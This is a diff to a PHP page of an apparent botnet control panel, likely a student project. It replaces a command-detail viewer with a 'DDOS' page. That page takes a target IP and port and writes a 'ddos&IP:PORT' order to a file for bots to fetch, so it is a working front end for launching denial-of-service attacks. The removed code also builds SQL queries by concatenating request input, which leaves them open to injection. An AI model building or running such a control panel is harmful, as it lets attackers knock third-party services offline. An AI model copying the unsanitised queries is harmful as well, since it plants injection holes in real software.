@@ -1,40 +1,11 @@
-
 <?php
+
+$header_display = "DDOS";
+
 session_start();
-$header_display = "View Cmd Detail";
-
 if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
-  $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
-  if (mysqli_connect_errno()) exit;
-
-  $header_display = "CMD Detail ";
-  $IdCmd = "";
-  $Ip = "";
-  $Port = "";
-  $Cmd = "";
-  $CmdResult = "";
-  $Time = "";
-
-  if (isset($_REQUEST['IdCmd'])) {
-    $id = $_REQUEST['IdCmd'];
-    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
-    if (mysqli_connect_errno()) exit;
-    $sql = "Select cmd.IdCmd, cmd.Cmd,cmd.CmdResult,cmd.Time, bot.Ip, bot.Port from cmd,bot where IdCmd = " . $id . " and bot.Id = cmd.IdBot";
-    $rs = mysqli_query($db, $sql);
-
-
-
-
-    while ($row = mysqli_fetch_array($rs)) {
-      $IdCmd = $row["IdCmd"];
-      $Ip = $row["Ip"];
-      $Port = $row["Port"];
-      $Cmd = $row["Cmd"];
-      $CmdResult = $row["CmdResult"];
-      $Time = $row["Time"];
-    }
-  }
-  echo '<!DOCTYPE html>
+  echo '
+<!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
@@ -129,11 +100,16 @@ if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
       .content {
         display: flex;
         flex-direction: column;
-        align-items: center;
-        justify-content: space-between; 
+        justify-content: space-between;
         width: 100%;
         min-height: 90%;
         padding: 30px;
+      }
+      .content_form
+      {
+        width: 30%;
+        height: 100%;
+        justify-self: flex-start;
       }
       .content_table {
         width: 100%;
@@ -166,14 +142,14 @@ if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
       }
        .content_element {
             width: 100%;
-            margin-bottom: 12px;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
+            min-height: 75px;
+           
+           
             /* align-items: center; */
         }
 
         .content_element-label {
+          display:block;
             font-size: 16px;
             min-width: 120px;
             margin-bottom: 8px;
@@ -201,6 +177,28 @@ if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
             cursor:pointer;
             align-self: flex-start;
         }
+        .password_error, .username_error{
+            font-size:12px;
+        }
+
+        .form_button{
+            margin-top:4px;
+            background: transparent;
+            color: #00ff00;
+            outline: none;
+            border: 1px solid #00ff00;
+            padding:2px 6px;
+            font-size:16px;
+            border-radius:4px;
+            cursor:pointer;
+
+        }
+        .form_button:hover{
+            background: #00ff00;;
+            color: black; 
+            transition-delay: 0.1s;
+        }
+
     </style>
   </head>
 
@@ -235,47 +233,34 @@ if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
           </ul>
         </div>
         <div class="content">
+        <div class="content_form">
+            <form action="ddos.php" onsubmit="return handleSubmit()" name="f1" method="POST" class="content_form-input">
           <div class="content_element">
-            <label class="content_element-label" for="ip">Id Cmd</label>
+            <label class="content_element-label" for="ip">IP</label>
             <input
               class="content_element-input"
-                value="' . $IdCmd . '"
-              readonly
+                value=""
+                id="ip"
+                onchange="handleChange()"
+                name="ip"
             />
+             <p class="ip_error"></p>
           </div>
-          <div class="content_element">
-            <label class="content_element-label" for="ip">Ip : Port</label>
+          <div class="content_element" >
+            <label class="content_element-label" for="password">Port</label>
             <input
               class="content_element-input"
-                value="' . $Ip . ' : ' . $Port . '"
-              readonly
+                value=""
+                type="text"
+                id="port"
+                onchange="handleChange()"
+                name="port"
             />
+            <p class="port_error"> </p>
           </div>
-
-          <div class="content_element">
-            <label class="content_element-label" for="ip">Time</label>
-            <input
-              class="content_element-input"
-                value="' . $Time . '"
-              readonly
-            />
-          </div>
-          <div class="content_element">
-            <label class="content_element-label" for="ip">Cmd</label>
-             <textarea
-              class="content_element-input"
-             readonly
-                rows="2"
-            >' . $Cmd . '</textarea>
-          </div>
-          <div class="content_element">
-            <label class="content_element-label" for="ip">Result</label>
-            <textarea
-              class="content_element-input"
-               readonly
-                rows="8"
-            >' . $CmdResult . '</textarea>
-          </div>
+          <button class="form_button" type="submit">DDOS</button>
+        </div>
+          </form>
           <button class="content_back" onclick="history.back()">Go Back</button>
         </div>
       </div>
@@ -285,9 +270,72 @@ if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
   echo '
     </div>
   </body>
+
+  <script>
+        let ip_error = document.querySelector(".ip_error");
+        let port_error = document.querySelector(".port_error");
+        let ip = document.getElementById("ip");
+        let port = document.getElementById("port");
+        let reg = /^\d+$/;
+        console.log(ip)
+        console.log(port)
+        function handleSubmit() {
+
+            if (port.value === "" || ip.value === "") {
+                if(port.value === "")
+                {
+                    port_error.innerHTML = "Port cannot be empty"
+                }
+                if(ip.value === "")
+                {
+                    ip_error.innerHTML = "Ip cannot be empty"
+                }
+                return false
+            } else {
+              let check = true
+              console.log(ip.value.split(\'.\').length)
+              if(ip.value.split(\'.\').length != 4)
+              {
+                ip_error.innerHTML = "Ip invalid format"
+                check = false
+              }
+              else
+              {
+                ip.value.split(\'.\').forEach((item)=>{
+                  if(reg.test(item)== false || +item <0 || +item > 255)
+                  {
+                    ip_error.innerHTML = "Ip invalid format";
+                    check = false
+                  }
+                })
+              }
+              if(reg.test(port.value)==false)
+              {
+                port_error.innerHTML = "Port invalid format";
+                check = false
+              }
+              return check
+            }
+        }
+
+        function handleChange() {
+            ip_error.innerHTML = "";
+            port_error.innerHTML = "";
+        }
+    </script>
 </html>
 ';
+  if (
+    isset($_REQUEST['ip']) && isset($_REQUEST['port'])
+  ) {
+    $fp = fopen('commandBot.txt', 'w');
+    fwrite($fp, "ddos");
+    fwrite($fp, '&');
+    fwrite($fp, $_REQUEST['ip']);
+    fwrite($fp, ':');
+    fwrite($fp, $_REQUEST['port']);
+    fclose($fp);
+  }
 } else {
   include_once('noLogin.php');
 }
-?>
